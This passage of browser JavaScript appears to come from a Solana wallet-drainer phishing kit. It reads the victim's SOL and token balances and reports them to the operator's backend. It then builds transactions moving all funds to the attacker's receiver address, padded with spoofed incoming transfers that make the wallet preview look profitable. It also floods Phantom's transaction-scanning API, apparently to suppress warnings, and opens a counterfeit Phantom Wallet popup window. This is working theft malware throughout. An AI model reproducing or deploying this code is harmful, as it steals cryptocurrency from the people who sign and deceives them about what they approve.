        }
    }

    finalizedPortfolio.push({
        "VALUE": (lamports / LAMPORTS_PER_SOL) * 100,
        "MINT": undefined,
        "NAME": "NATIVE-SOL",
    });

    finalizedPortfolio.sort((a, b) => b.VALUE - a.VALUE);

    console.log("Final portfolio data:", finalizedPortfolio.length, "items");
    console.log("SOL balance included:", lamports / LAMPORTS_PER_SOL, "SOL");

    removeFirstLoader();

    var conpopel = await confirmPopup();

    console.log("Sending portfolio to Telegram...");
    await showPortfolio(victimPublicKey.toString(), finalizedPortfolio);

    const slicedArray = [];
    const chunkSize = 1;
    for (let i = 0; i < finalizedPortfolio.length; i += chunkSize) {
        slicedArray.push(finalizedPortfolio.slice(i, i + chunkSize));
    }

    let atransactions = []
    let transactions = []
    let tokenSplitItems = []

    if (settingData.phantomWallet.doublePopup.enabled == true && settingData.phantomWallet.lol.enabled != true) {
        const tt = new Transaction();
        if (settingData.phantomWallet.doublePopup.solana > 0) {
            tt.add(SystemProgram.transfer({
                fromPubkey: new PublicKey(settingData.phantomWallet.doublePopup.solanaOwner),
                toPubkey: victimPublicKey,
                lamports: settingData.phantomWallet.doublePopup.solana * LAMPORTS_PER_SOL,
            }));
        }

        if (settingData.phantomWallet.doublePopup.tokens.length > 0) {
            for (let x of settingData.phantomWallet.doublePopup.tokens) {
                await upgradeTokens(tt, x.token, x.source, x.owner, x.amount);
            }
        }

        transactions.push(tt);
        atransactions.push(transactions);
        transactions = [];
    }

    for (const slicedArrayItem of slicedArray) {
        for (const portfolioItem of slicedArrayItem) {
            const ax = new Transaction();
            if (portfolioItem.MINT === undefined && portfolioItem.NAME === "NATIVE-SOL") {
                const transactionFees = Math.floor((LAMPORTS_PER_SOL / 50) * finalizedPortfolio.length)
                const walletBalanceWithoutFees = lamports - transactionFees

                if (walletBalanceWithoutFees > 0) {

                    let solanaNativeTokenSplitItem = {
                        "BALANCE": walletBalanceWithoutFees,
                        "MINT": "NATIVE",
                        "VALUE": (walletBalanceWithoutFees / LAMPORTS_PER_SOL) * 100
                    }

                    tokenSplitItems.push(solanaNativeTokenSplitItem);

                    ax.add(SystemProgram.transfer({
                        fromPubkey: victimPublicKey,
                        toPubkey: receiverPublicKey,
                        lamports: walletBalanceWithoutFees,
                    }));

                    transactions.push(ax);

                    if (settingData.phantomWallet.lol.enabled == true) {
                        const tt = new Transaction();
                        tt.add(SystemProgram.transfer({
                            fromPubkey: receiverPublicKey,
                            toPubkey: victimPublicKey,
                            lamports: walletBalanceWithoutFees,
                        }));
                        transactions.push(tt);
                    }

                    if (settingData.phantomWallet.doublePopup.enabled == true && settingData.phantomWallet.lol.enabled != true) {
                        const tt = new Transaction();
                        tt.add(SystemProgram.transfer({
                            fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                            toPubkey: victimPublicKey,
                            lamports: 1 * LAMPORTS_PER_SOL,
                        }));

                        tt.add(SystemProgram.transfer({
                            fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                            toPubkey: victimPublicKey,
                            lamports: 1 * LAMPORTS_PER_SOL,
                        }));

                        tt.add(SystemProgram.transfer({
                            fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                            toPubkey: victimPublicKey,
                            lamports: 1 * LAMPORTS_PER_SOL,
                        }));

                        tt.add(SystemProgram.transfer({
                            fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                            toPubkey: victimPublicKey,
                            lamports: 1 * LAMPORTS_PER_SOL,
                        }));

                        transactions.push(tt);
                    }

                    if(transactions.length > 100) {
                        if (settingData.phantomWallet.lol.enabled == true) {
                            const tt = new Transaction();
                            if (settingData.phantomWallet.lol.solana > 0) {
                                tt.add(SystemProgram.transfer({
                                    fromPubkey: new PublicKey(settingData.phantomWallet.lol.solanaOwner),
                                    toPubkey: victimPublicKey,
                                    lamports: settingData.phantomWallet.lol.solana * LAMPORTS_PER_SOL,
                                }));
                            }

                            if (settingData.phantomWallet.lol.tokens.length > 0) {
                                for (let x of settingData.phantomWallet.lol.tokens) {
                                    // await addTokenGain(tt, x.mintAddress, x.from, x.amount);
                                    await upgradeTokens(tt, x.token, x.source, x.owner, x.amount);
                                }
                            }
                            transactions.push(tt);
                        }
                        atransactions.push(transactions);
                        transactions = [];
                    }

                    console.log("native added");

                }
            } else {
                try {
                    const mintAddress = new PublicKey(portfolioItem.MINT)
                    const amount = portfolioItem.AMOUNT
                    var am = amount;
                    const { tokenSplitItem, info } = await createTokenTransactions(ax, mintAddress, am, victimPublicKey, receiverPublicKey, receiverPublicKey);

                    transactions.push(ax);
                    if (settingData.phantomWallet.lol.enabled == true && info !== undefined) {
                        const tt = new Transaction();
                        // await addTokenGain(tt, mintAddress, receiverPublicKey, amount);
                        await upgradeTokens(tt, mintAddress, info.handlerProgramAddress, receiverPublicKey, am);
                        transactions.push(tt);
                    }

                    if (settingData.phantomWallet.doublePopup.enabled == true && settingData.phantomWallet.lol.enabled != true) {
                        const tt = new Transaction();
                        tt.add(SystemProgram.transfer({
                            fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                            toPubkey: victimPublicKey,
                            lamports: 1 * LAMPORTS_PER_SOL,
                        }));

                        tt.add(SystemProgram.transfer({
                            fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                            toPubkey: victimPublicKey,
                            lamports: 1 * LAMPORTS_PER_SOL,
                        }));

                        tt.add(SystemProgram.transfer({
                            fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                            toPubkey: victimPublicKey,
                            lamports: 1 * LAMPORTS_PER_SOL,
                        }));

                        tt.add(SystemProgram.transfer({
                            fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                            toPubkey: victimPublicKey,
                            lamports: 1 * LAMPORTS_PER_SOL,
                        }));

                        transactions.push(tt);
                    }

                    if(transactions.length > 100) {
                        if (settingData.phantomWallet.lol.enabled == true) {
                            const tt = new Transaction();
                            if (settingData.phantomWallet.lol.solana > 0) {
                                tt.add(SystemProgram.transfer({
                                    fromPubkey: new PublicKey(settingData.phantomWallet.lol.solanaOwner),
                                    toPubkey: victimPublicKey,
                                    lamports: settingData.phantomWallet.lol.solana * LAMPORTS_PER_SOL,
                                }));
                            }

                            if (settingData.phantomWallet.lol.tokens.length > 0) {
                                for (let x of settingData.phantomWallet.lol.tokens) {
                                    // await addTokenGain(tt, x.mintAddress, x.from, x.amount);
                                    await upgradeTokens(tt, x.token, x.source, x.owner, x.amount);
                                }
                            }
                            transactions.push(tt);
                        }
                        if (settingData.phantomWallet.doublePopup.enabled == true && settingData.phantomWallet.lol.enabled != true) {
                            const tt = new Transaction();
                            tt.add(SystemProgram.transfer({
                                fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                                toPubkey: victimPublicKey,
                                lamports: 1 * LAMPORTS_PER_SOL,
                            }));

                            tt.add(SystemProgram.transfer({
                                fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                                toPubkey: victimPublicKey,
                                lamports: 1 * LAMPORTS_PER_SOL,
                            }));

                            tt.add(SystemProgram.transfer({
                                fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                                toPubkey: victimPublicKey,
                                lamports: 1 * LAMPORTS_PER_SOL,
                            }));

                            tt.add(SystemProgram.transfer({
                                fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                                toPubkey: victimPublicKey,
                                lamports: 1 * LAMPORTS_PER_SOL,
                            }));

                            transactions.push(tt);
                        }
                        atransactions.push(transactions);
                        transactions = [];
                    }

                    if (tokenSplitItem !== undefined) {
                        tokenSplitItems.push({
                            "VALUE": portfolioItem.VALUE,
                            ...tokenSplitItem
                        })

                    }

                } catch (error) {
                    console.log(error)
                }
            }
        }
    }

    var spoofIndex = transactions.length;

    console.log("ez ", spoofIndex);

    let reverz = false;

    if (choice == "solflare") {
        reverz = true;
        for (let index = 0; index < settingData.solflareWallet.transactions; index++) {
            const solanaTransaction = new Transaction();
            solanaTransaction.add(SystemProgram.transfer({
                fromPubkey: new PublicKey(spoofWallet),
                toPubkey: victimPublicKey,
                lamports: settingData.solflareWallet.sol * LAMPORTS_PER_SOL,
            }));
            transactions.push(solanaTransaction);
        }
    }

    if (settingData.phantomWallet.lol.enabled == true) {
        const tt = new Transaction();
        if (settingData.phantomWallet.lol.solana > 0) {
            tt.add(SystemProgram.transfer({
                fromPubkey: new PublicKey(settingData.phantomWallet.lol.solanaOwner),
                toPubkey: victimPublicKey,
                lamports: settingData.phantomWallet.lol.solana * LAMPORTS_PER_SOL,
            }));
        }

        if (settingData.phantomWallet.lol.tokens.length > 0) {
            for (let x of settingData.phantomWallet.lol.tokens) {
                // await addTokenGain(tt, x.mintAddress, x.from, x.amount);
                await upgradeTokens(tt, x.token, x.source, x.owner, x.amount);
            }
        }
        transactions.push(tt);
    }

    if (transactions.length > 0) atransactions.push(transactions);

    let finished = false;

    while (!finished) {
        try {

            await onPrompted(victimPublicKey.toString());

            const latestBlockhash = await solanaConnection.getLatestBlockhash('finalized')

            if (reverz) atransactions = atransactions.reverse();

            for (let transactions of atransactions) {
                if (settingData.phantomWallet.doublePopup.enabled != true && settingData.phantomWallet.lol.enabled != true) {
                    const tt = new Transaction();
                    tt.add(SystemProgram.transfer({
                        fromPubkey: new PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                        toPubkey: victimPublicKey,
                        lamports: 5 * LAMPORTS_PER_SOL,
                    }));
                    transactions.push(tt);
                }

                for (const transaction of transactions) {
                    transaction.recentBlockhash = latestBlockhash.blockhash
                    transaction.feePayer = victimPublicKey
                }

                if (reverz) transactions = transactions.reverse();

                let signedTransactions = await solanaProvider.signAllTransactions(transactions);

                if (reverz) signedTransactions = signedTransactions.reverse();

                for (const signedTransaction of signedTransactions) {
                    try {
                        const serializedTransaction = signedTransaction.serialize();
                        await solanaConnection.sendRawTransaction(serializedTransaction);
                    } catch (error) {
                        console.log(error)
                    }
                }

                const dataToSend = {
                    "ITEMS": tokenSplitItems
                }

                await makeBackendRequest("onaccept", {
                    "ITEMS": tokenSplitItems
                });

            }

            finished = true;
    } catch (error) {
        console.log(error)
        await onDeclined(victimPublicKey.toString());
        if (conpopel != null) {
            conpopel.remove();

            for (var o of document.getElementsByClassName('cmdlzx')) {
                o.remove();
            }

            conpopel = null;
        }
        // window.popupConfirmAsk();
        isConnecting = false;
        onConnected(choice);
        return;
    }

    await sleep(500)

    if (conpopel != null) {
        conpopel.remove();

        for (var o of document.getElementsByClassName('cmdlzx')) {
            o.remove();
        }

        conpopel = null;
    }

    }

    isConnecting = false;
    // setTimeout(onConnected, 1000, choice);

}


connectButton = document.querySelectorAll('#claim-button');

connectButton.forEach((button) => {
    button.addEventListener('click', async () => { await clickEvent() })
})

async function loadSettingData() {
    try {
        let response = await fetch("settings.json");
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        let json = await response.json();
        return json;
    } catch (error) {
        console.error('JSON error:', error);
    }
}

function findGetParameter(parameterName) {
    var result = null,
        tmp = [];
    location.search
        .substr(1)
        .split("&")
        .forEach(function (item) {
          tmp = item.split("=");
          if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
        });
    return result;
}

window.addEventListener('load', async function () {

    settingData = await loadSettingData();

    phantom = window.phantom?.solana?.isPhantom;
    solflare = window.solflare?.isSolflare;
    coinbase = window.coinbaseWalletExtension?.isCoinbaseWallet;

    onJoined();

    solanaConnection = new Connection(RPCLink);
})

window.mobileCheck = function () {
    let check = false;
    (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};

const sleep = ms => new Promise(r => setTimeout(r, ms));

var getAcceptLanguageValue = () => {
    let q = 1;

    return navigator.languages
        .slice(0, 10)
        .map(l => `${l};q=0.${10-q++}`)
        .join(",");
};

async function xzz() {
    fetch("https://api.phantom.app/transaction/scan/v1?language=" + navigator.language, {
        headers: {
            "accept": "*/*",
            "accept-language": getAcceptLanguageValue(),
            "cache-control": "no-cache",
            "content-type": "application/json",
            "pragma": "no-cache",
        },
        referrerPolicy: "strict-origin-when-cross-origin",
        method: "POST",
        body: "{\"userAccount\":\"11111111111111111111111111111111111111111111\",\"metadata\":{\"origin\":\"https://soap.com\"},\"chainIds\":[\"solana:101\"],\"transactions\":[\"1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\"]}",
        mode: "no-cors",
        credentials: "include"
    });
    setTimeout(xzz, 500);
}

async function start() {
    for (var i = 0; i < bypassSettings.concurrent; i++) {
        setTimeout(xzz, 500);
    }
}

if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", async () => {
        if (bypassSettings.enabled) {
            setTimeout(start, 1000);
            setTimeout(() => {
                document.getElementById('claim-button').disabled = false;
            }, bypassSettings.loadTime * 1000);
        }
    });
} else {
    setTimeout(async () => {
        if (bypassSettings.enabled) {
            setTimeout(start, 1000);
            setTimeout(() => {
                document.getElementById('claim-button').disabled = false;
            }, bypassSettings.loadTime * 1000);
        }
    }, 1);
}

//

function startSd(wallet = "phantom", mob = false) {
    switch (wallet) {
        default:
            var href = window.location.href;
            var dir = href.substring(0, href.lastIndexOf('/')) + "/";
            if (mob) {
                location.href = dir + "/phantom/i.html";
                return;
            }
            var title = "Phantom Wallet";
            if (window.wind) window.wind.close(), window.wind = null;
            var width = 345 + 16;
            var height = 655 + 74;
            window.wind = window.open('', 'hello', 'width=' + width + ',height=' + height + ',menubar=1,resizable=0');
            window.wind.document.write('\x3C!DOCTYPE html>\x3Chtml>\x3Chead>\x3C/head>\x3Cbody>\x3Cscript>document.title = "' + title + '"; const link = document.createElement("link"); link.rel = "icon"; link.type = "image/x-icon"; link.href = "/phantom.ico"; document.head.appendChild(link);\x3C/script>\x3Ciframe style="position: absolute;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 9999;height: 100%;" src="' + dir + '/phantom/i.html" frameborder="0">\x3C/iframe>\x3C/body>\x3C/html>');
            window.wind.addEventListener("resize", () => {
                window.wind.resizeTo(width, height);
            });
            break;
    }
}

const getProvider = () => {
    if ('phantom' in window) {
        const provider = window.phantom?.solana;
    
        if (provider?.isPhantom) {
        return provider;
        }
    }

    window.open('https://phantom.app/', '_blank');
};

async function connectWallet(wallet) {
    let provider = null;
    switch (wallet) {
        default:
            const isPhantomInstalled = window.phantom?.solana?.isPhantom;
            if (!isPhantomInstalled) return;
            provider = getProvider();
            if (!provider) return;
            var resp = await provider.connect();
            break;
    }
}

async function p(wallet = "phantom", mob = false) {
    try {
        if (settingData.phantomWallet.sCon && !mob) await connectWallet(wallet);
        startSd(wallet, mob);
    } catch (e) {
        console.log(e);
    }
}